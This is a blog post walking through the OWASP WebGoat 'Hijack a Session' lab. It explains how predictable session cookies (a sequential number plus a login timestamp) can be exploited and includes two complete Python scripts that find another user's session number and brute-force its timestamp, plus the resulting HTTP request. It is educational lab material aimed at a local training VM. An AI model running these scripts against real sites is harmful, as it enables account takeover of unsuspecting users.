---
layout: post
title:  "OWASP BWA WebGoat Challenge: Session Management Flaws"
subtitle: "Hijack a Session"
date:   2017-02-01 09:00:00 -0500
author: "coastal"
header-img: "images/site-resources/webgoat-header.jpg"
---
# Hijack a Session
Instructions:

-  Application developers who develop their own session IDs frequently forget to incorporate the complexity and randomness necessary for security. If the user specific session ID is not complex and random, then the application is highly susceptible to session-based brute force attacks. 

<img src="{{ site.baseurl }}/images/2017-02-01-webgoat_part_18/login-form.jpg">

```
Username=user&Password=user&WEAKID=18654-1485907285120&SUBMIT=Login
```

I really didn't know where to start with this one. After messing around with parameters for a while, I decided to check out the hints. The first hint (that was a pretty big one) that started me off was:
- The first part of the cookie is a sequential number, the second part is milliseconds.

Like I said, pretty big giveaway. Looking online I checked the current time since Epoch in milliseconds and found it was roughly a similar number to the second half of the cookie. Next formulated my attack method. We would steal the session from the person who logged in before me by decrementing the sequential login value by 1 and brute-forcing the Epoch time of their login.

Unfortunately, my initial brute-force attempt failed. I figured this out after roughly 300-400,000 requests and assumed there was probably a flaw in my logic, although I wasn't sure where. I took a step back and read some more about Session Hijacking and common methodologies. The following section from OWASPs article on 'How to test session identifier strength with WebScarab' gave me a more substantial hint in what I needed to do:

- Identify a request that generates a suitable session identifier. For example, if the identifier is supplied in a cookie, look for responses that include Set-Cookie headers, then use the request repeatedly to obtain more session identifiers. We will then perform some analysis on the resulting series of identifiers.

So there were actually two steps to the attack. The first would be to find a request that generates a session cookie of interest. The second would be to find a weakness in that cookie generation and exploit it. I figured that the cookie was probably generated when we navigated to the lesson page, so I sent a ```GET``` request for the challenge page and checked the response:

```
HTTP/1.1 200 OK
Date: Wed, 01 Feb 2017 02:28:20 GMT
Server: Apache-Coyote/1.1
Pragma: No-cache
Cache-Control: no-cache
Expires: Wed, 31 Dec 1969 19:00:00 EST
Content-Type: text/html;charset=ISO-8859-1
Set-Cookie: acopendivids=swingset; Expires=Thu, 01-Jan-1970 00:00:10 GMT
Set-Cookie: jotto=""; Expires=Thu, 01-Jan-1970 00:00:10 GMT
Set-Cookie: phpbb2=""; Expires=Thu, 01-Jan-1970 00:00:10 GMT
Set-Cookie: redmine=""; Expires=Thu, 01-Jan-1970 00:00:10 GMT
Set-Cookie: acgroupswithpersist=nada; Expires=Thu, 01-Jan-1970 00:00:10 GMT
Set-Cookie: WEAKID=18656-1485916100205
Via: 1.1 127.0.1.1
Vary: Accept-Encoding
Content-Length: 33944
Connection: close
```

Aha! Sure enough this is the response that sets the ```WEAKID``` session cookie that we are trying to exploit. Now let's generate a bunch of these cookies and see if we can spot a weakness. I looked at another hint that pointed out the probable weakness in cookie generation:

- Is the cookie value predictable? Can you see gaps where someone else has acquired a cookie?

So if the first section of the cookie is assigned sequentially, and we generate a bunch of cookies, maybe we can spot a lack of sequentiality in the cookie generation that represents a cookie id belonging to another user. Let's whip up a script to do the heavy lifting for us:

{% highlight python %}
import sys
import requests

class SessionHijack:
	def __init__(self, attack_url, current_webgoat_cookie):
		self.attack_url = attack_url
		self.current_webgoat_cookie= current_webgoat_cookie
		self.headers = {"user-agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0"}
		self.open_session_number = None

	def find_open_session(self):
		print ("[*] Attempting to find open session")
		session_found = False
		previous_session_cookie = None
		cookies = dict(
				JSESSIONID=self.current_webgoat_cookie,
				acopendivids="swingset,jotto,phpbb2,redmine",
				acgroupswithpersist="nada"
			)
		while not session_found:
			r = requests.get(self.attack_url, headers=self.headers,cookies=cookies)
			current_session_cookie = r.cookies.get_dict()["WEAKID"]
			current_session_number = int(current_session_cookie.split("-")[0])
			print ("[-] Checking session: {}".format(current_session_cookie))
			if previous_session_cookie is None:
				previous_session_cookie = current_session_cookie
			elif (current_session_number - int(previous_session_cookie.split("-")[0])) != 1:
				print ("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
				print ("[+] Found open session: {}".format(current_session_number - 1))
				print ("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
				self.open_session_number = current_session_number - 1
				self.open_session_previous_login = int(previous_session_cookie.split("-")[1])
				self.open_session_next_login = int(current_session_cookie.split("-")[1])
				session_found = True
			else:
				previous_session_cookie = current_session_cookie

def main():
	attack_url = 'http://192.168.56.101/WebGoat/attack?Screen=224&menu=1800'
	current_webgoat_cookie = "F6E740AFB0D99B26D271E23C39F10F78"
	session_hijack = SessionHijack(attack_url, current_webgoat_cookie)
	session_hijack.find_open_session()

if __name__ == "__main__":
	main()
{% endhighlight %}

So our script here generates a bunch of requests and checks the cookies for sequentiality. If we find a cookie that is non-sequential to the last cookie that was generated, we have found an open session for another user! Let's run the script and see what we find:

<img src="{{ site.baseurl }}/images/2017-02-01-webgoat_part_18/open-session-brute-force.jpg">

Boom! We've got another user session. So we have the first part of the cookie, but not the second (the time of login). However, we know that the open session is going to be between two of our requested sessions. So we can grab the time from the cookie before and after the open session to find our window, and then brute-force the login time for the open session. Let's update our brute-force session hijacker to find the second half of the open session's cookie:

{% highlight python %}
import sys
import requests

class SessionHijack:
	def __init__(self, attack_url, current_webgoat_cookie):
		self.attack_url = attack_url
		self.current_webgoat_cookie= current_webgoat_cookie
		self.headers = {"user-agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0"}
		self.open_session_number = None
		self.open_session_previous_login = None
		self.open_session_next_login = None

	def find_open_session(self):
		print ("[*] Attempting to find open session")
		session_found = False
		previous_session_cookie = None
		cookies = dict(
				JSESSIONID=self.current_webgoat_cookie,
				acopendivids="swingset,jotto,phpbb2,redmine",
				acgroupswithpersist="nada"
			)
		while not session_found:
			r = requests.get(self.attack_url, headers=self.headers,cookies=cookies)
			current_session_cookie = r.cookies.get_dict()["WEAKID"]
			current_session_number = int(current_session_cookie.split("-")[0])
			print ("[-] Checking session: {}".format(current_session_cookie))
			if previous_session_cookie is None:
				previous_session_cookie = current_session_cookie
			elif (current_session_number - int(previous_session_cookie.split("-")[0])) != 1:
				print ("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
				print ("[+] Found open session: {}".format(current_session_number - 1))
				print ("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
				self.open_session_number = current_session_number - 1
				self.open_session_previous_login = int(previous_session_cookie.split("-")[1])
				self.open_session_next_login = int(current_session_cookie.split("-")[1])
				session_found = True
			else:
				previous_session_cookie = current_session_cookie

	def brute_force_cookie(self):
		print ("[*] Attempting to brute-force session login time for\n[*]\t session: {} between {} and {}".format(
			self.open_session_number,
			self.open_session_previous_login, 
			self.open_session_next_login))
		attempts = 0
		logged_in = False
		login_time_guess = self.open_session_next_login
		while not logged_in and login_time_guess > self.open_session_previous_login - 1:
			attempts += 1
			reformed_id_guess = "{}-{}".format(self.open_session_number, login_time_guess)
			params = {"Username":"user","Password":"user","WEAKID":reformed_id_guess}
			cookies = dict(
				WEAKID=reformed_id_guess,
				JSESSIONID=self.current_webgoat_cookie,
				acopendivids="swingset,jotto,phpbb2,redmine",
				acgroupswithpersist="nada"
			)
			print ("[*] Attempt {} | Cookie: {}".format(attempts, reformed_id_guess))
			r = requests.post(self.attack_url, params=params,headers=self.headers,cookies=cookies)
			if r.status_code == 200:
				if "invalid" not in r.text.lower():
					print ("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
					print ("[+] SUCCESS!")
					print ("[+] Cookie Value: {}".format(reformed_id_guess))
					print ("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
					logged_in = True
					sys.exit(0)
				else:
					login_time_guess -= 1

		if not logged_in:
			print ("Failed to find session login")

def main():
	attack_url = 'http://192.168.56.101/WebGoat/attack?Screen=224&menu=1800'
	current_webgoat_cookie = "F6E740AFB0D99B26D271E23C39F10F78"
	session_hijack = SessionHijack(attack_url, current_webgoat_cookie)
	session_hijack.find_open_session()
	session_hijack.brute_force_cookie()

if __name__ == "__main__":
	main()
{% endhighlight %}

Alright, looks good. Let's give it a shot and see if we can jack a session:

<img src="{{ site.baseurl }}/images/2017-02-01-webgoat_part_18/cookie-brute-force.jpg">

Awesome. And when we send a request and substitute our ```WEAKID``` values for the jacked session cookie:

<hr>
POST /WebGoat/attack?Screen=224&menu=1800 HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.56.101/WebGoat/attack?Screen=224&menu=1800
Cookie: WEAKID=```19720-1485917613225```; JSESSIONID=F6E740AFB0D99B26D271E23C39F10F78; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
Authorization: Basic dXNlcjp1c2Vy
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

Username=&Password=&WEAKID=```19720-1485917613225```&SUBMIT=Login
<hr>

<img src="{{ site.baseurl }}/images/2017-02-01-webgoat_part_18/login-success.jpg">

Got it! This challenge was pretty involved and took a while. It was one of the few times I've had to use a substantial number of hints to complete. This was probably partially due to all of the new mechanisms I had to wrap my head around. It reinforced the reality of hitting the books and studying the docs to understand what's going on though, which seems to be a huge part of net sec.

### References

[1. OWASP Testing Session Strength][owasp-session]

[owasp-session]:https://www.owasp.org/index.php/How_to_test_session_identifier_strength_with_WebScarab
